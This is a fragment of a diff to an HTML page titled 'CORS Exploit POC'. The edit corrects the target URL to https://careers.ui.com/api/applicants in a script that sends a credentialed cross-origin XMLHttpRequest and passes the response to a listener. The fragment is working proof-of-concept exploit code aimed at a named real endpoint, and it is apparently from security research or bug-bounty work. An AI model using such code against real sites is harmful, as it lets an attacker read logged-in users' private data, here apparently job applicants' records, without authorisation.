@@ -6,7 +6,7 @@
 		<h1>CORS Exploit POC</h1>
 		<script>
 			var cors = new XMLHttpRequest();
-			var Victim_url = 'careers.ui.com/api/applicants';
+			var Victim_url = 'https://careers.ui.com/api/applicants';
 			cors.open('GET', Victim_url, true);
 			cors.withCredentials = true;
 			cors.onload = reqListener;
